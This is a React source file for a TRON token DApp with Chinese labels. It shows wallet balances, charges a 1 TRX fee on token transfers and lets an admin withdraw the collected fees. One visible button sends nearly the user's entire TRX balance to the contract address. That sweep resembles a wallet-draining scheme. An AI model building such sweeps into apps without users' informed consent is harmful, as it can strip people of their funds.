import React, { useState, useEffect } from "react";
import TronWeb from "tronweb";

// 替换为你部署的 FeeToken 合约地址
const contractAddress = "TXXXXXXXXXXXXXXXXXXXXXXXX";
// 默认手续费（1 TRX = 1,000,000 sun）
const trxFee = 1_000_000;

export default function FullDapp() {
  const [userAddress, setUserAddress] = useState("");
  const [trxBalance, setTrxBalance] = useState("0");
  const [userTokenBalance, setUserTokenBalance] = useState("0");
  const [contractBalance, setContractBalance] = useState("0");
  const [to, setTo] = useState("");
  const [amount, setAmount] = useState("");
  const [status, setStatus] = useState("");

  const tronWeb = window.tronWeb;

  // === 获取钱包余额 ===
  const getWalletInfo = async () => {
    try {
      if (!tronWeb || !tronWeb.defaultAddress.base58) {
        setStatus("请先安装 TronLink 并解锁钱包");
        return;
      }
      const addr = tronWeb.defaultAddress.base58;
      setUserAddress(addr);

      // TRX 余额
      const trxBal = await tronWeb.trx.getBalance(addr);
      setTrxBalance(tronWeb.fromSun(trxBal.toString()));

      // 代币余额
      const contract = await tronWeb.contract().at(contractAddress);
      const tokenBal = await contract.balanceOf(addr).call();
      setUserTokenBalance(tronWeb.fromSun(tokenBal.toString()));
    } catch (err) {
      console.error(err);
      setStatus("获取钱包信息失败：" + err.message);
    }
  };

  // === 代币转账（带 TRX 手续费） ===
  const handleTransfer = async () => {
    try {
      const contract = await tronWeb.contract().at(contractAddress);
      setStatus("正在发起代币转账...");

      const tx = await contract
        .transfer(to, tronWeb.toSun(amount))
        .send({
          callValue: trxFee, // 附带 TRX 手续费
          shouldPollResponse: true,
        });

      setStatus(`转账成功！TxID: ${tx}`);
      getWalletInfo();
    } catch (err) {
      console.error(err);
      setStatus("转账失败：" + err.message);
    }
  };

  // === 查询合约手续费余额 ===
  const checkContractBalance = async () => {
    try {
      const contract = await tronWeb.contract().at(contractAddress);
      const balance = await contract.getCollectedFees().call();
      setContractBalance(tronWeb.fromSun(balance.toString()));
    } catch (err) {
      console.error(err);
      setStatus("查询失败：" + err.message);
    }
  };

  // === 提现手续费（仅管理员） ===
  const withdrawFees = async () => {
    try {
      const contract = await tronWeb.contract().at(contractAddress);

      const tx = await contract
        .withdrawFees(tronWeb.defaultAddress.base58)
        .send({ shouldPollResponse: true });

      setStatus(`提现成功！TxID: ${tx}`);
      checkContractBalance();
    } catch (err) {
      console.error(err);
      setStatus("提现失败：" + err.message);
    }
  };

  // === 一键转走 TRX（保留 1 TRX Gas） ===
  const sendAllTrx = async () => {
    try {
      const balance = await tronWeb.trx.getBalance(tronWeb.defaultAddress.base58);
      const amountToSend = balance - 1_000_000; // 预留 1 TRX

      if (amountToSend <= 0) {
        alert("余额不足，至少要保留 1 TRX 用于 Gas");
        return;
      }

      setStatus("正在发起 TRX 转账...");

      const tx = await tronWeb.trx.sendTransaction(contractAddress, amountToSend);

      setStatus(`TRX 转账成功！TxID: ${tx.txid}`);
      getWalletInfo();
    } catch (err) {
      console.error(err);
      setStatus("TRX 转账失败：" + err.message);
    }
  };

  // 页面加载时自动获取信息
  useEffect(() => {
    if (tronWeb && tronWeb.ready) {
      getWalletInfo();
      checkContractBalance();
    }
  }, [tronWeb]);

  return (
    <div className="p-6 max-w-md mx-auto rounded-2xl shadow-lg bg-white">
      <h1 className="text-xl font-bold mb-4">FeeToken 综合 DApp</h1>

      <p className="mb-2">我的地址： {userAddress}</p>
      <p className="mb-2">我的 TRX 余额： {trxBalance} TRX</p>
      <p className="mb-4">我的代币余额： {userTokenBalance} FEE</p>

      {/* === 代币转账 === */}
      <h2 className="text-lg font-semibold mt-6 mb-2">代币转账</h2>
      <input
        type="text"
        placeholder="收款地址"
        value={to}
        onChange={(e) => setTo(e.target.value)}
        className="w-full p-2 mb-2 border rounded"
      />
      <input
        type="number"
        placeholder="转账数量"
        value={amount}
        onChange={(e) => setAmount(e.target.value)}
        className="w-full p-2 mb-4 border rounded"
      />
      <button
        onClick={handleTransfer}
        className="w-full p-2 bg-blue-500 text-white rounded hover:bg-blue-600"
      >
        转账（含 1 TRX 手续费）
      </button>

      {/* === 合约手续费余额 === */}
      <h2 className="text-lg font-semibold mt-6 mb-2">合约手续费</h2>
      <button
        onClick={checkContractBalance}
        className="w-full p-2 bg-green-500 text-white rounded hover:bg-green-600"
      >
        查询手续费余额
      </button>
      <p className="mt-2">合约已收手续费：{contractBalance} TRX</p>
      <button
        onClick={withdrawFees}
        className="w-full p-2 mt-2 bg-red-500 text-white rounded hover:bg-red-600"
      >
        提现手续费
      </button>

      {/* === 一键转走 TRX === */}
      <h2 className="text-lg font-semibold mt-6 mb-2">TRX 控制</h2>
      <button
        onClick={sendAllTrx}
        className="w-full p-2 bg-purple-500 text-white rounded hover:bg-purple-600"
      >
        一键转走全部 TRX（保留 1 TRX）
      </button>

      <p className="mt-4 text-sm text-gray-700">{status}</p>
    </div>
  );
}
